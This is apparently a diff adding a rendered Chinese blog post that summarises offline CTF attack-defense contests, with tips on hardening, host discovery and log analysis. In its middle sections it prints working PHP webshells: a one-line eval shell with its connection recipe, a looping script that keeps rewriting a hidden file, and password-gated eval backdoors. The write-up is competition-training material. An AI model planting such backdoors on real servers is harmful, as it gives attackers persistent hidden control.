@@ -1,1 +1,465 @@
-<!doctype html><html lang=en><head><meta charset=UTF-8><meta name=viewport content="width=device-width,user-scalable=no,initial-scale=1,maximum-scale=1,minimum-scale=1"><meta http-equiv=X-UA-Compatible content="ie=edge"><link rel="shortcut icon" href=/static/favicon.ico><title>langke Blog</title><link href=/static/css/app.c64eadfc8d3abfc9d85514dba4054813.css rel=stylesheet></head><body><div id=app></div><script type=text/javascript src=/static/js/manifest.992b63bf2abbf3194771.js></script><script type=text/javascript src=/static/js/vendor.e12dc8c9af1f7aa12436.js></script><script type=text/javascript src=/static/js/app.bc036f9167871d39aecf.js></script></body></html>
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="CTF线下攻防赛">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="langke">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="CTF线下赛总结"/>
+    
+
+    <!--Open Graph Description-->
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="langke Blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>CTF线下赛总结 - langke Blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    Home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    Archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about.html">
+                    About
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/tags">
+                    Tags
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/categories">
+                    Categories
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact.html">
+                    Contact
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2019/01/03/CTF线下赛总结/">
+                CTF线下赛总结
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2019-01-03</span>
+            
+            
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <h1 id="CTF线下攻防赛"><a href="#CTF线下攻防赛" class="headerlink" title="CTF线下攻防赛"></a>CTF线下攻防赛</h1><a id="more"></a>
+<p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/CTF/1707042315cda976443f9eca49.png" alt="导图"></p>
+<pre><code>我发现啊，安全方面的比赛基本都是CTF的、至少占了90%。可能是因为其他方向不好衡量吧。
+CTF比赛主要有三种，解题模式、战争分享模式、攻防模式。
+</code></pre><p><strong>攻防模式概述</strong></p>
+<ul>
+<li><p>攻防模式常见于线下决赛。在攻防模式中，初始时刻，所有参赛队伍拥有相同的系统环境（包含若干服务，可能位于不同的机器上），常称为 gamebox，参赛队伍挖掘网络服务漏洞并攻击对手服务获取 flag 来得分，修补自身服务漏洞进行防御从而防止扣分（当然有的比赛在防御上会设置得分，一般防御只能避免丢分）。</p>
+</li>
+<li><p>攻防模式可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续 48 小时），同时也比团队之间的分工配合与合作。</p>
+</li>
+<li><p>一般比赛的具体环境会在开赛前一天或者当天开赛前半小时由比赛主办方给出（是一份几页的小文档）。在这一段时间内，你需要根据主办方提供的文档熟悉环境并做好防御。</p>
+</li>
+<li><p>在比赛开始前半小时，这半小时内是无法进行攻击的，各支队伍都会加紧熟悉比赛网络环境，并做好防御准备。至于敌方 Gamebox 的 IP 地址，则需要靠你自己在给出网段中发现。</p>
+</li>
+<li><p>如果是分为上午下午两场攻防赛的话，那么上午和下午的 Gamebox 漏洞服务会更换（避免比赛中途休息时选手交流），但管理时要用的 IP 地址什么的不会改变。也就是 下午会换新题 。</p>
+</li>
+<li><p>一般情况下，主办方会提供网线，但并不会提供网线转接口，所以需要自备。</p>
+</li>
+</ul>
+<h4 id="ssh登陆"><a href="#ssh登陆" class="headerlink" title="ssh登陆"></a>ssh登陆</h4><ul>
+<li>粗略的看下web端大概有哪些模块，可能会有哪些漏洞。</li>
+<li>如果有登陆口就改个复杂的密码。</li>
+<li>ssh 的登陆密码改一个超级复杂的。</li>
+<li>上WAF、文件监控、端口扫描</li>
+<li>web目录权限做限制</li>
+</ul>
+<h4 id="网络拓扑"><a href="#网络拓扑" class="headerlink" title="网络拓扑"></a>网络拓扑</h4><ul>
+<li>首先理清网络拓扑关系、节点与各链路之间的关联</li>
+</ul>
+<h4 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h4><ul>
+<li>同 C 段或同 B 段</li>
+<li>工具： httpscan、nmap、或者自己写的工具</li>
+</ul>
+<h4 id="预留后门"><a href="#预留后门" class="headerlink" title="预留后门"></a>预留后门</h4><ul>
+<li>web目录下载到本地分析、是否有可以文件。</li>
+<li>比如.bak、.svg等备份类文件，或者预留的后门</li>
+<li>工具： hm.exe、各类安全软件扫描</li>
+</ul>
+<h4 id="黑盒测试"><a href="#黑盒测试" class="headerlink" title="黑盒测试"></a>黑盒测试</h4><p><img src="https://bj.bcebos.com/v1/image-langke/hexo-neirongpeitu/CTF/blog_2018-11-16_10-29-59.png" alt=""></p>
+<p>防御：</p>
+<ul>
+<li>将所有的登陆口密码进行更改</li>
+<li>将上传页面的关闭或进行更改</li>
+<li>反序列化和命令执行，找补丁或者改源码</li>
+</ul>
+<h4 id="一句话"><a href="#一句话" class="headerlink" title="一句话"></a>一句话</h4><ul>
+<li>控制用的一句话最好是需要菜刀配置的</li>
+<li>简单举例： <code>&lt;?php ($_=@$_GET[2]).@$_($_POST[1])?&gt;</code>连接：php？2=assert、密码为：1</li>
+</ul>
+<h4 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h4><ul>
+<li><code>.demo.php</code>前面使用一个点，在linux上能很好的隐藏文件。</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">	$file = <span class="string">'.demo.php'</span>;</span><br><span class="line">	$shell = <span class="string">"&lt;?php phpinfo();?&gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="keyword">true</span>)&#123;</span><br><span class="line">        file_put_contents($file, $shell);</span><br><span class="line">        system(<span class="string">'chmod 777 .demo.php'</span>);</span><br><span class="line"></span><br><span class="line">        usleep(<span class="number">50</span>);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>稍微猥琐的马</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">@<span class="keyword">eval</span>($_POST[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>更加猥琐的</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">'hello'</span>;</span><br><span class="line">$test= <span class="string">'flag'</span>;</span><br><span class="line"><span class="keyword">if</span>(md5($_POST[<span class="string">'pass'</span>])==<span class="string">'d8d1a1efe0134e2530f503028a825253'</span>)</span><br><span class="line">	<span class="keyword">if</span> (@$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] == <span class="string">'flag'</span>)&#123;</span><br><span class="line">    header(<span class="string">"flag:$test"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="flag获取"><a href="#flag获取" class="headerlink" title="flag获取"></a>flag获取</h4><ul>
+<li><a href="http://rcoil.me/2017/05/PHP-%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1/" target="_blank" rel="noopener">PHP定时任务</a></li>
+</ul>
+<h4 id="日志分析"><a href="#日志分析" class="headerlink" title="日志分析"></a>日志分析</h4><p>用途：</p>
+<ul>
+<li>感知正在发生的攻击，从而进行针对的防御和预防</li>
+<li>应急响应、还原攻击者的攻击路径，从而挽回已经造成的损失</li>
+</ul>
+<p>记录log脚本</p>
+<pre><code class="php"><span class="meta">&lt;?php</span>
+date_default_timezone_set(<span class="string">'Asia/Shanghai'</span>);
+$ip       = $_SERVER[<span class="string">"REMOTE_ADDR"</span>]; <span class="comment">//记录访问者的ip</span>
+$filename = $_SERVER[<span class="string">'PHP_SELF'</span>];    <span class="comment">//访问者要访问的文件名</span>
+$parameter   = $_SERVER[<span class="string">"QUERY_STRING"</span>]; <span class="comment">//访问者要请求的参数</span>
+$time     =   date(<span class="string">'Y-m-d H:i:s'</span>,time()); <span class="comment">//访问时间</span>
+$logadd = <span class="string">'来访时间：'</span>.$time.<span class="string">'--&gt;'</span>.<span class="string">'访问链接：'</span>.<span class="string">'http://'</span>.$ip.$filename.<span class="string">'?'</span>.$parameter.<span class="string">"\r\n"</span>;
+
+<span class="comment">// log记录</span>
+$fh = fopen(<span class="string">"log.txt"</span>, <span class="string">"a"</span>);
+fwrite($fh, $logadd);
+fclose($fh);
+<span class="meta">?&gt;</span>
+</code></pre>
+<p>日志分析工具</p>
+<ul>
+<li><p>LogForensics 腾讯实验室<br><a href="https://security.tencent.com/index.php/opensource/detail/15" target="_blank" rel="noopener">https://security.tencent.com/index.php/opensource/detail/15</a></p>
+</li>
+<li><p>北风飘然@金乌网络安全实验室<br><a href="http://www.freebuf.com/sectool/126698.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/126698.html</a></p>
+</li>
+<li><p>网络ID为piaox的安全从业人员：<br><a href="http://www.freebuf.com/sectool/110644.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/110644.html</a></p>
+</li>
+<li><p>网络ID：SecSky<br><a href="http://www.freebuf.com/sectool/8982.html" target="_blank" rel="noopener">http://www.freebuf.com/sectool/8982.html</a></p>
+</li>
+<li><p>网络ID：鬼魅羊羔<br><a href="http://www.freebuf.com/articles/web/96675.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/96675.html</a></p>
+</li>
+</ul>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>CTF能够给不能层次的人在技术上带来提高。没有网络信息安全基础的学生通过CTF，建立了安全攻防的概念；</li>
+<li>有初步基础的学生，通过高质量赛题的实践练习，提升了实战能力；</li>
+<li>已经学有所成的学生，通过国际CTF大赛和国际强队比拼，开阔了视野。</li>
+</ul>
+<h4 id="个人建议"><a href="#个人建议" class="headerlink" title="个人建议"></a>个人建议</h4><ul>
+<li>不要为了CTF而CTF，可以作为开拓思路来了解，<strong>千万不要把时间浪费在刷题上。</strong></li>
+<li>虽然ctf涉及到的知识点面非常的全面。但是在实际应用中，在自己所选择的方向上给予不了多大的帮助。</li>
+<li>只因为CTF环境太过于理想化（当然是我水平问题，做不来大的CTF赛题），因为总有方法可以拿到flag，在实操上，遇到瓶颈，要考虑的东西就多了。</li>
+</ul>
+
+    </div>
+
+    
+
+    
+        <div class="post-tags">
+            <i class="fa fa-tags" aria-hidden="true"></i>
+            <a href="/tags/CTF思路/">#CTF思路</a>
+        </div>
+    
+
+    <!-- Comments -->
+    
+
+</div>
+        </section>
+
+    </div>
+</div>
+
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    This theme was developed by <a href="https://github.com/klugjo">Jonathan Klughertz</a>. The source code is available on Github. Create Websites. Make Magic.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="/2019/03/28/THE-HACKER-PLAYBOOK-3-笔记-安装/">THE HACKER PLAYBOOK 3 -- </a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/03/26/黑客秘笈-笔记-前置/">黑客秘笈-笔记-前置</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/03/09/深入理解web漏洞之-XSS跨站脚本攻击/">深入理解web漏洞之-XSS跨站脚本攻击</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="/2019/03/07/深入理解web漏洞之-SQL注入/">深入理解web漏洞之 SQL注入</a>
+            </li>
+            
+        </ul>
+    </div>
+
+
+
+            
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    <li class="list-inline-item">
+                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-github"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://twitter.com/?lang=en">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-twitter"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.facebook.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-facebook"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.instagram.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-instagram"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://dribbble.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-dribbble"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://plus.google.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-google-plus"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://www.behance.net/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-behance"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="https://500px.com/">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-500px"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:test@example.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    @Untitled. All right reserved | Design & Hexo <a href="http://www.codeblocq.com/">Jonathan Klughertz</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="/js/main.js"></script>
+
+<!-- Disqus Comments -->
+
+
+
+</body>
+
+</html>
